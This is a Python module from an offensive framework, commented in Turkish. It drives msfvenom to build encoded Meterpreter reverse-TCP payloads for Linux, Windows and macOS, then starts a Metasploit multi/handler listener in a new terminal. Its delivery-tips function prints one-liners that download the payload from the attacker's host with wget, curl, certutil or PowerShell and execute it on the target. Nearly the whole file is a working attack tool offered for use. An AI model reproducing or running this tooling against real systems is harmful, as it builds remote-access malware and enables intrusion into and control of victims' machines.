"""
Meterpreter Reverse TCP Payload Üreticisi.

Hedef işletim sistemine göre msfvenom ile uygun meterpreter payload'u oluşturur.
Opsiyonel olarak msfconsole'u yeni bir terminal penceresinde başlatarak
multi/handler dinleyicisini otomatik konfigüre eder.

Desteklenen hedef OS'ler:
  - linux   → linux/x64/meterpreter/reverse_tcp
  - windows → windows/x64/meterpreter/reverse_tcp
  - macos   → osx/x64/meterpreter/reverse_tcp

Gereksinimler:
  - Metasploit Framework (msfvenom, msfconsole) yüklü olmalı.
"""

import os
import platform
import shutil
import subprocess
import tempfile
from typing import Any

from rich import print as rprint

from core.module import BaseModule
from core.option import Option


# ── OS → Metasploit payload eşleşme tablosu ──────────────────────────────────
_PAYLOAD_MAP: dict[str, dict[str, str]] = {
    "linux": {
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "format": "elf",
        "ext": "",
        "description": "Linux x64 Meterpreter (ELF)",
    },
    "windows": {
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "format": "exe",
        "ext": ".exe",
        "description": "Windows x64 Meterpreter (PE/EXE)",
    },
    "macos": {
        "payload": "osx/x64/meterpreter/reverse_tcp",
        "format": "macho",
        "ext": "",
        "description": "macOS x64 Meterpreter (Mach-O)",
    },
}

# Kullanıcıya gösterilecek seçenekler
_OS_CHOICES = ["linux", "windows", "macos"]


class Payload(BaseModule):
    """Meterpreter Reverse TCP — msfvenom payload üretici ve msfconsole başlatıcı."""

    Name = "meterpreter/reverse_tcp"
    Description = (
        "Hedef OS'e göre msfvenom ile Meterpreter payload üretir. "
        "Yeni terminalde msfconsole multi/handler başlatabilir."
    )
    Author = "Mahmut P."
    Category = "payloads"

    Requirements: dict[str, list[str]] = {
        "system": ["msfvenom", "msfconsole"],
    }

    def __init__(self) -> None:
        super().__init__()
        self.Options = {
            "LHOST": Option(
                "LHOST", "0.0.0.0", True, "Dinleyen IP adresi (callback)."
            ),
            "LPORT": Option("LPORT", 4444, True, "Dinleyen Port numarası."),
            "TARGET_OS": Option(
                "TARGET_OS",
                "",
                True,
                "Hedef işletim sistemi (linux / windows / macos).",
                choices=_OS_CHOICES,
            ),
            "OUTPUT": Option(
                "OUTPUT",
                "",
                False,
                "Üretilen payload dosya yolu (boş = ekrana bas).",
                completion_dir=".",
            ),
            "AUTO_HANDLER": Option(
                "AUTO_HANDLER",
                "true",
                False,
                "Yeni terminalde msfconsole handler otomatik açılsın mı? (true/false)",
                choices=["true", "false"],
            ),
            "ENCODER": Option(
                "ENCODER",
                "",
                False,
                "msfvenom encoder (örn: x86/shikata_ga_nai). Boş = encoder yok.",
            ),
            "ITERATIONS": Option(
                "ITERATIONS",
                1,
                False,
                "Encoder iterasyon sayısı.",
            ),
        }

    # ── Yardımcı: İşletim sistemi algılama (lokal makine) ─────────────────────
    @staticmethod
    def _detect_local_os() -> str:
        """Çalıştığımız makinenin OS'unu döndürür (linux/windows/macos)."""
        system = platform.system().lower()
        if system == "darwin":
            return "macos"
        if system == "windows":
            return "windows"
        return "linux"

    # ── Yardımcı: msfvenom ile payload üret ───────────────────────────────────
    def _generate_payload(
        self,
        lhost: str,
        lport: int,
        target_os: str,
        output_path: str,
        encoder: str,
        iterations: int,
    ) -> str | None:
        """
        msfvenom komutu çalıştırarak payload binary/dosya üretir.

        Returns:
            Üretilen dosyanın yolu veya None (hata durumunda).
        """
        info = _PAYLOAD_MAP.get(target_os)
        if not info:
            rprint(f"[bold red][!] Desteklenmeyen hedef OS: {target_os}[/bold red]")
            return None

        msf_payload = info["payload"]
        fmt = info["format"]
        ext = info["ext"]

        # Çıktı dosyası belirlenmemişse geçici dosya oluştur
        if not output_path:
            output_path = os.path.join(
                tempfile.gettempdir(),
                f"meterpreter_{target_os}_{lport}{ext}",
            )
        elif not output_path.endswith(ext) and ext:
            output_path += ext

        cmd = [
            "msfvenom",
            "-p", msf_payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", fmt,
            "-o", output_path,
        ]

        # Encoder belirtilmişse ekle
        if encoder:
            cmd.extend(["-e", encoder, "-i", str(iterations)])

        rprint(f"[bold cyan][*] msfvenom çalıştırılıyor...[/bold cyan]")
        rprint(f"    Payload : {msf_payload}")
        rprint(f"    Format  : {fmt}")
        rprint(f"    Output  : {output_path}")
        if encoder:
            rprint(f"    Encoder : {encoder} (x{iterations})")

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120,
            )
            if result.returncode != 0:
                rprint(f"[bold red][!] msfvenom hata:[/bold red]\n{result.stderr}")
                return None

            rprint(f"[bold green][+] Payload başarıyla oluşturuldu: {output_path}[/bold green]")
            # Çalıştırılabilir yap (Linux/macOS)
            if target_os in ("linux", "macos"):
                os.chmod(output_path, 0o755)
                rprint(f"[*] Dosya çalıştırılabilir yapıldı (chmod +x)")
            return output_path

        except FileNotFoundError:
            rprint(
                "[bold red][!] msfvenom bulunamadı. "
                "Metasploit Framework'ün kurulu ve PATH'te olduğundan emin olun.[/bold red]"
            )
            return None
        except subprocess.TimeoutExpired:
            rprint("[bold red][!] msfvenom zaman aşımına uğradı (120s).[/bold red]")
            return None
        except Exception as e:
            rprint(f"[bold red][!] msfvenom çalıştırma hatası: {e}[/bold red]")
            return None

    # ── Yardımcı: Yeni terminalde msfconsole başlat ──────────────────────────
    def _launch_msfconsole(
        self,
        lhost: str,
        lport: int,
        target_os: str,
    ) -> bool:
        """
        Yeni bir terminal penceresi açarak msfconsole multi/handler başlatır.
        mah-framework açık kalır (subprocess.Popen, bloklamaz).

        Returns:
            True: msfconsole başarıyla başlatıldıysa.
        """
        info = _PAYLOAD_MAP.get(target_os)
        if not info:
            return False

        msf_payload = info["payload"]

        # msfconsole için Resource Script oluştur (geçici dosya)
        rc_content = (
            f"use exploit/multi/handler\n"
            f"set PAYLOAD {msf_payload}\n"
            f"set LHOST {lhost}\n"
            f"set LPORT {lport}\n"
            f"set ExitOnSession false\n"
            f"exploit -j -z\n"
        )

        rc_path = os.path.join(tempfile.gettempdir(), "mah_meterpreter_handler.rc")
        with open(rc_path, "w") as f:
            f.write(rc_content)

        rprint(f"[bold cyan][*] msfconsole yeni terminalde başlatılıyor...[/bold cyan]")
        rprint(f"    Resource : {rc_path}")
        rprint(f"    Payload  : {msf_payload}")
        rprint(f"    LHOST    : {lhost}")
        rprint(f"    LPORT    : {lport}")

        # İşletim sistemine göre yeni terminal açma
        local_os = self._detect_local_os()
        msfconsole_cmd = f"msfconsole -r {rc_path}"

        try:
            if local_os == "macos":
                # macOS: Terminal.app veya iTerm2 ile yeni pencere aç
                apple_script = (
                    f'tell application "Terminal"\n'
                    f"    activate\n"
                    f'    do script "{msfconsole_cmd}"\n'
                    f"end tell"
                )
                subprocess.Popen(
                    ["osascript", "-e", apple_script],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )

            elif local_os == "linux":
                # Linux: Yaygın terminal emülatörlerini dene
                terminal = None
                for term_cmd in [
                    "gnome-terminal",
                    "konsole",
                    "xfce4-terminal",
                    "mate-terminal",
                    "xterm",
                    "lxterminal",
                    "terminator",
                    "alacritty",
                    "kitty",
                ]:
                    if shutil.which(term_cmd):
                        terminal = term_cmd
                        break

                if terminal is None:
                    rprint(
                        "[bold red][!] Terminal emülatörü bulunamadı. "
                        "Manuel çalıştırın:[/bold red]"
                    )
                    rprint(f"    {msfconsole_cmd}")
                    return False

                if terminal == "gnome-terminal":
                    subprocess.Popen(
                        [terminal, "--", "bash", "-c", msfconsole_cmd],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                elif terminal == "konsole":
                    subprocess.Popen(
                        [terminal, "-e", msfconsole_cmd],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                elif terminal in ("xterm", "lxterminal"):
                    subprocess.Popen(
                        [terminal, "-e", msfconsole_cmd],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                elif terminal in ("alacritty", "kitty"):
                    subprocess.Popen(
                        [terminal, "-e", "bash", "-c", msfconsole_cmd],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                else:
                    subprocess.Popen(
                        [terminal, "-e", f"bash -c '{msfconsole_cmd}'"],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )

            elif local_os == "windows":
                # Windows: Yeni cmd penceresi aç
                subprocess.Popen(
                    ["cmd.exe", "/c", "start", "cmd.exe", "/k", msfconsole_cmd],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )

            rprint(
                "[bold green][+] msfconsole yeni terminal penceresinde başlatıldı![/bold green]"
            )
            rprint(
                "[*] Meterpreter oturumu geldiğinde msfconsole penceresinden "
                "etkileşime geçebilirsiniz."
            )
            return True

        except FileNotFoundError as e:
            rprint(f"[bold red][!] Terminal başlatma hatası: {e}[/bold red]")
            rprint(f"[*] Manuel olarak çalıştırın: {msfconsole_cmd}")
            return False
        except Exception as e:
            rprint(f"[bold red][!] Beklenmeyen hata: {e}[/bold red]")
            rprint(f"[*] Manuel olarak çalıştırın: {msfconsole_cmd}")
            return False

    # ── Kullanıcıya bilgi göster ─────────────────────────────────────────────
    def _print_delivery_tips(self, target_os: str, output_path: str, lhost: str, lport: int) -> None:
        """Payload'ı hedefe nasıl iletebileceğine dair ipuçları gösterir."""
        rprint("\n[bold yellow]━━━ Payload Teslim Yöntemleri ━━━[/bold yellow]")

        if target_os == "linux":
            rprint(f"  [cyan]1)[/cyan] wget http://{lhost}:8080/{os.path.basename(output_path)} -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload")
            rprint(f"  [cyan]2)[/cyan] curl http://{lhost}:8080/{os.path.basename(output_path)} -o /tmp/payload && chmod +x /tmp/payload && /tmp/payload")
        elif target_os == "windows":
            rprint(f"  [cyan]1)[/cyan] certutil -urlcache -split -f http://{lhost}:8080/{os.path.basename(output_path)} %TEMP%\\payload.exe && %TEMP%\\payload.exe")
            rprint(f"  [cyan]2)[/cyan] powershell -c \"IWR http://{lhost}:8080/{os.path.basename(output_path)} -OutFile $env:TEMP\\payload.exe; & $env:TEMP\\payload.exe\"")
        elif target_os == "macos":
            rprint(f"  [cyan]1)[/cyan] curl http://{lhost}:8080/{os.path.basename(output_path)} -o /tmp/payload && chmod +x /tmp/payload && /tmp/payload")

        rprint(f"\n  [dim]HTTP server başlatmak için: python3 -m http.server 8080 --directory {os.path.dirname(output_path)}[/dim]")
        rprint("[bold yellow]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold yellow]\n")

    # ── Ana generate metodu ──────────────────────────────────────────────────
    def generate(self) -> str:
        """
        msfvenom komutunu string olarak döndürür (ekrana basmak için).
        Payload binary üretimi run() içinde yapılır.
        """
        lhost = self.get_option_value("LHOST")
        lport = self.get_option_value("LPORT")
        target_os = str(self.get_option_value("TARGET_OS")).lower().strip()

        info = _PAYLOAD_MAP.get(target_os)
        if not info:
            return f"# Desteklenmeyen OS: {target_os}"

        cmd = f"msfvenom -p {info['payload']} LHOST={lhost} LPORT={lport} -f {info['format']}"
        return cmd

    # ── Ana çalıştırma metodu ────────────────────────────────────────────────
    def run(self, options: dict[str, Any]) -> str | None:
        lhost = str(self.get_option_value("LHOST"))
        lport = int(self.get_option_value("LPORT"))
        target_os = str(self.get_option_value("TARGET_OS")).lower().strip()
        output_path = str(self.get_option_value("OUTPUT") or "")
        auto_handler = str(self.get_option_value("AUTO_HANDLER")).lower() == "true"
        encoder = str(self.get_option_value("ENCODER") or "")
        iterations = int(self.get_option_value("ITERATIONS") or 1)

        # Hedef OS doğrulama
        if target_os not in _PAYLOAD_MAP:
            rprint(
                f"[bold red][!] Geçersiz TARGET_OS: '{target_os}'. "
                f"Seçenekler: {', '.join(_OS_CHOICES)}[/bold red]"
            )
            return None

        info = _PAYLOAD_MAP[target_os]
        rprint(f"\n[bold cyan]{'='*60}[/bold cyan]")
        rprint(f"[bold cyan]  Meterpreter Reverse TCP — {info['description']}[/bold cyan]")
        rprint(f"[bold cyan]{'='*60}[/bold cyan]\n")

        # 1) msfvenom ile payload üret
        result_path = self._generate_payload(
            lhost, lport, target_os, output_path, encoder, iterations
        )

        if result_path is None:
            return None

        # 2) Teslim ipuçlarını göster
        self._print_delivery_tips(target_os, result_path, lhost, lport)

        # 3) AUTO_HANDLER aktifse yeni terminalde msfconsole başlat
        if auto_handler:
            rprint("[bold cyan][*] msfconsole multi/handler başlatılıyor...[/bold cyan]")
            self._launch_msfconsole(lhost, lport, target_os)
        else:
            # Manuel resource script bilgisi ver
            rprint("[bold yellow][*] Manuel handler başlatma:[/bold yellow]")
            rprint(f"    msfconsole -x \"use exploit/multi/handler; "
                   f"set PAYLOAD {info['payload']}; "
                   f"set LHOST {lhost}; set LPORT {lport}; exploit\"")

        rprint(f"\n[bold green][✓] Meterpreter modülü tamamlandı.[/bold green]")
        rprint(f"[*] mah-framework aktif kalmaya devam ediyor.\n")

        return result_path
